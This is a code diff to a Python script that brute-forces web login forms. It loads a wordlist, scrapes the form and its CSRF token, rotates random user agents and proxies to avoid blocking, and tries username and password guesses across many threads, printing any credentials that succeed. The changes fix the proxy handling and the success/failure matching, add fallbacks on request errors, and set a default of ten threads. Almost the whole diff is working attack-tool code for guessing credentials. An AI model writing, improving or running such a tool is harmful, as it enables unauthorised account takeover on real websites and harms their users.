@@ -27,14 +27,14 @@ wordlist = [word.replace('\n','') for word in temp]
 def login(fail,success,username,password):
     global useproxy
     header = {
-        'user-agent': random.choice(useragents)
+        'user-agent': random.choice(list(useragents))
     }
     if useproxy.lower().startswith('y'):
-        temproxy = {
+        proxy = {
             'http': random.choice(proxies),
             'https': random.choice(proxies)
         }
-        res = req.get(target,proxies=temproxy,headers=header)
+        res = req.get(target,proxies=proxy,headers=header)
     else:
         res = req.get(target,headers=header)    
     soup = bs4.BeautifulSoup(res.content,features='lxml')
@@ -55,54 +55,68 @@ def login(fail,success,username,password):
             token.get('name'): token.get('value')
         }
     if form.get('method').lower() == 'get':
-        if not form.get('action') == '' or not form.get('action'):
-            if temproxy:
-                res = req.get(target,headers=header,params=data,proxies=temproxy)
-            else:
+        if not form.get('action'):
+            try:
+                if proxy:
+                    res = req.get(target,headers=header,params=data,proxies=proxy)
+                else:
+                    res = req.get(target,headers=header,params=data)
+            except:
                 res = req.get(target,headers=header,params=data)
-            
-            if res.text in success:
-                return True
-            elif res.text in fail:
+            if fail in res.text:
+                print(res.text)
                 return False
+            elif success in res.text:
+                return True
+            
             else:
+                print(res.text)
                 return False
         else:
-            if temproxy:
-                res = req.get(form.get('action'),headers=header,params=data,proxies=temproxy)
-            else:
+            try:
+                if proxy:
+                    res = req.get(form.get('action'),headers=header,params=data,proxies=proxy)
+                else:
+                    res = req.get(form.get('action'),headers=header,params=data)
+            except:
                 res = req.get(form.get('action'),headers=header,params=data)
             
-            if res.text in success:
-                return True
-            elif res.text in fail:
+            if fail in res.text:
                 return False
+            elif success in res.text:
+                return True
             else:
                 return False
             
     if form.get('method').lower() == 'post':
         if not form.get('action') == '' or not form.get('action'):
-            if temproxy:
-                res = req.post(target,headers=header,json=data,proxies=temproxy)
-            else:
+            try:
+                if proxy:
+                    res = req.post(target,headers=header,json=data,proxies=proxy)
+                else:
+                    res = req.post(target,headers=header,json=data)
+            except:
                 res = req.post(target,headers=header,json=data)
-            
-            if res.text in success:
-                return True
-            elif res.text in fail:
+            if fail in res.text:
                 return False
+            elif success in res.text:
+                return True
+            
             else:
                 return False
         else:
-            if temproxy:
-                res = req.post(form.get('action'),headers=header,json=data,proxies=temproxy)
-            else:
+            try:
+                if proxy:
+                    res = req.post(form.get('action'),headers=header,json=data,proxies=proxy)
+                else:
+                    res = req.post(form.get('action'),headers=header,json=data)
+            except:
                 res = req.post(form.get('action'),headers=header,json=data)
             
-            if res.text in success:
-                return True
-            elif res.text in fail:
+            if fail in res.text:
                 return False
+            elif success in res.text:
+                return True
             else:
                 return False
 
@@ -113,20 +127,27 @@ def loop():
                 res = login(fail=wrongmsg,success=successmsg,username=word,password=word)
             else:
                 res = login(fail=wrongmsg,success=successmsg,username=user,password=word)
-            if not res:
+            if res == False:
                 if user == '':
                     print(f'{Fore.RED}[Wrong]{Fore.RESET}\n     Username : {word}\n    Password : {word}')
                 else:
                     print(f'{Fore.RED}[Wrong]{Fore.RESET}\n     Username : {user}\n    Password : {word}')
-            elif res:
+            elif res == True:
                 if user == '':
                     print(f'{Fore.GREEN}[Success]{Fore.RESET}\n     Username : {word}\n    Password : {word}')
                 else:
                     print(f'{Fore.GREEN}[Success]{Fore.RESET}\n     Username : {user}\n    Password : {word}')
+                exit()
         except KeyboardInterrupt:
             print('Exiting...')
             exit()
 
-for _ in range(int(threadnum)):
-    t = threading.Thread(target=loop)
-    t.start()
+if not threadnum == '':
+    for _ in range(int(threadnum)):
+        t = threading.Thread(target=loop)
+        t.start()
+
+else:
+    for _ in range(10):
+        t = threading.Thread(target=loop)
+        t.start()
